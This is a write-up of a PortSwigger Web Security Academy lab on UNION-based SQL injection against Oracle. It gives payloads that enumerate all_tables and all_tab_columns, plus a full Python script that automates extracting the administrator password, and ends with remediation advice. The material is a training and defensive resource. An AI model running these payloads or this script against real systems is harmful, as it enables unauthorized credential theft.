# SQL Injection Attack, Listing the Database Contents on Oracle
**Platform:** PortSwigger Web Security Academy
**Category:** SQL Injection
**Date:** 2026-08-23

## The Problem
The application's product category filter ran a query similar to:

```sql
SELECT * FROM products WHERE category = 'Gifts'
```

This lab is the Oracle counterpart to lab 9's schema discovery. Oracle does not implement the standard `information_schema` used by MySQL, PostgreSQL, and SQL Server — it exposes schema metadata through its own system views instead, so the same three-stage attack (find table → find columns → extract data) requires Oracle-specific syntax.

## Discovery / Exploitation
Oracle's equivalents to `information_schema.tables` and `information_schema.columns` are `all_tables` and `all_tab_columns`:

**1. Find the relevant table name:**
```sql
' UNION SELECT TABLE_NAME, NULL FROM all_tables--
```
Scanning the results for a table name starting with `USERS_` identifies the credentials table (Oracle labs commonly randomize the suffix, e.g. `USERS_A8F3D`).

**2. Find the relevant column names:**
```sql
' UNION SELECT COLUMN_NAME, NULL FROM all_tab_columns WHERE table_name = 'USERS_XXXXX'--
```
Scanning for columns containing "USERNAME" and "PASSWORD" (Oracle system views typically return names in uppercase) identifies exactly which columns hold the credentials.

**3. Extract the actual data:**
```sql
' UNION SELECT username_col, password_col FROM USERS_XXXXX--
```
With the table and column names confirmed, this pulls the real credential data — identical in principle to lab 9, just built on Oracle's system views instead of the ANSI-standard `information_schema`.

## Impact
Same outcome as lab 9 — full credential disclosure without needing to know the schema in advance — but confirms that lacking `information_schema` doesn't protect Oracle databases either; every major database engine exposes some form of built-in metadata that a UNION-based attack can query.

## Proof of Concept (Python)
This script mirrors the lab 9 script's structure, swapping in Oracle's `all_tables` and `all_tab_columns` system views and matching the uppercase naming convention Oracle typically returns.

```python
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def perform_request(url, sql_payload):
    path = "/filter?category=Gifts"
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    return r.text


def sqli_users_table(url):
    sql_payload = "'+UNION+SELECT+TABLE_NAME,NULL+FROM+all_tables--"
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    users_table = soup.find(string=re.compile(r'^USERS\_.*'))
    return users_table


def sqli_users_columns(url, users_table):
    sql_payload = "'+UNION+SELECT+COLUMN_NAME,NULL+FROM+all_tab_columns+WHERE+table_name='%s'--" % users_table
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    username_column = soup.find(string=re.compile('.*USERNAME.*'))
    password_column = soup.find(string=re.compile('.*PASSWORD.*'))
    return username_column, password_column


def sqli_administrator_cred(url, users_table, username_column, password_column):
    sql_payload = "'+UNION+select+%s,%s+from+%s--" % (username_column, password_column, users_table)
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    match = soup.find(string="administrator")
    if match is None:
        return False
    admin_password = match.parent.find_next('td').text
    print(admin_password)
    return admin_password


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s https://www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("Looking for users table...")
    users_table = sqli_users_table(url)
    if users_table:
        print("Found the Users Table Name: %s" % users_table)
        username_column, password_column = sqli_users_columns(url, users_table)
        if username_column and password_column:
            print("Found the username column name: %s" % username_column)
            print("Found the password column name: %s" % password_column)
            admin_password = sqli_administrator_cred(url, users_table, username_column, password_column)
            if admin_password:
                print("[+] the administrator password is: %s" % admin_password)
            else:
                print("Did not find the administrator password")
        else:
            print("Did not find the username or the password column")
    else:
        print("Did not find the users table.")
```

**How it works:**
1. `sqli_users_table()` — queries `all_tables` and uses a regex anchored to the start of the string (`^USERS_`) to match Oracle's randomized table-naming convention for this lab
2. `sqli_users_columns()` — queries `all_tab_columns` filtered to the discovered table, scanning for uppercase "USERNAME" and "PASSWORD" column names
3. `sqli_administrator_cred()` — builds the final UNION query from the discovered names and extracts the password next to "administrator"
4. The `main` block chains the three stages together with progress messages at each step

**Example run:**
```bash
python3 exploit_sqli_oracle_schema_discovery.py https://your-lab-url.web-security-academy.net
```

## Remediation
- Use **parameterized queries (prepared statements)** — prevents this attack the same way it prevents every other injection variant covered so far.
- Apply the **principle of least privilege** to the database account — restrict access to Oracle's system views (`all_tables`, `all_tab_columns`) where the application has no legitimate need for them.
- Avoid exposing **raw query output** that makes automated schema enumeration straightforward regardless of database engine.

## Takeaway
This lab confirms that schema-hiding is not a real defense on any major database engine — MySQL/PostgreSQL/SQL Server expose `information_schema`, and Oracle exposes its own equivalent system views (`all_tables`, `all_tab_columns`). The underlying attack methodology (discover table → discover columns → extract data) stays identical across engines; only the specific system view names and casing conventions change.
